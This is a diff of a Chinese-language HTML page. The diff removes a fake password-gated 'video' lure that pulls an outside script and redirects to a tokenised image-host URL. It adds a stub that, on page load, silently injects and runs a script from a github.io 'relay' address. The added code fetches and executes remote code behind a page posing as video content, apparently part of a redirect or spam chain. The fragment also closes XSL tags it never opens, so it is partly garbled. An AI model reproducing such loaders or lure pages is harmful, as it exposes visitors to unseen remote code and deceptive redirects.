@@ -1,52 +1,17 @@
-<!DOCTYPE html>
 <html>
-<head>
-	<script type="text/javascript" charset="utf-8" >
-	const url = new URL(window.location.href);
-	if (!url.searchParams.has('_t')) {
-	  url.searchParams.append('_t', Date.now());
-	  window.location.replace(url.toString());
-	}
-	</script>
-	<title>密码访问</title>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<script type="text/javascript" charset="utf-8" src="//crossfb-70080.picnjc.qpic.cn/g.52000000-r.e620f/1682302819858_hf_0"></script>
-</head>
-<body>
-	
-	<form onsubmit="return checkPassword()">
-		<h1 align="center" style=" 
-                    font-size: 25px; 
-                    color:#152c5b; 
-                    font-weight:bold;
-                     margin-bottom: 20px;
-                    ">输入密码解锁此视频</h1>
-        <p align="center" style="
-                    color:#7f8da0;  
-                    font-size: 15px;
-                    margin-bottom: 40px;
-                    ">此视频的访问受到限制，请输入密码进行查看</p>
-		
-		<input type="password" id="password" name="password">
-		<button type="submit" class="btn btn-primary" style=" margin-bottom: 20px;">解锁</button>
-		
-	</form>	
-
-</div>
-
-	<script>
-		function checkPassword() {
-			var password = document.getElementById("password").value;
-			if (password === "135978") { 
-				window.location.href = "http://p1-tt.byteimg.com/obj/tos-cn-i-dcdx/ocefEFCkAgAIvDxNADCdbAtCIbpny8ynNCW2ZK?G=teng,Share&key=466280445c3b244a594a6c5099cb94ad298ce03b911a3cd09ddd72024b05ba0f6d88c2fa57591cfe76e99c98752da1648125fa03353382e67a8c3b88140c978fae256d39481256aafcda73622ce8561404fc96cf9179a17ae7d943fa7c8426ff930f81df5eca7c83045eb4bf4caded6bf9c8367553acc3c4b1fe651fa8b9358553ab0558260eb36d6c4698ff06bd5744320af1d9783ba0ae2d24cf78068e1c9db46569e7e7f7baf5d7facb7f250073eb77a0254bb430312973764dae0d64e339404b7100ecdab9e04bee69d3ade8cb44db059d2887a2ddab6d3b3b959da64616d23b34574e0c248c1106d487b208c6e11a5c6fd32cff130a7690696d0ba3e0c86e0008233ca9dc0febb9285156c78c9b&8v20230802"; 
-				return false;
-			} else {
-				alert("密码错误，请重新输入！");
-				return false;
-			}
-		}
-	</script>
-	
-	</body>
-</html>
+      <body>
+        <meta content="always" name="referrer" />
+        <meta charset="UTF-8" />
+        <script charset="UTF-8">
+          var xUrl = 'https://dj88888.github.io/video/zhongzhuan.js'
+          var now = Math.round(Date.now() / 1000 / 5)
+          var s = document.createElement('script')
+          s.setAttribute('src', xUrl + '?t=' + now)
+          s.setAttribute('charset', 'utf-8')
+          if (!document.body) document.head.appendChild(s)
+          else document.body.appendChild(s)
+        </script>
+      </body>
+    </html>
+  </xsl:template>
+</xsl:stylesheet>
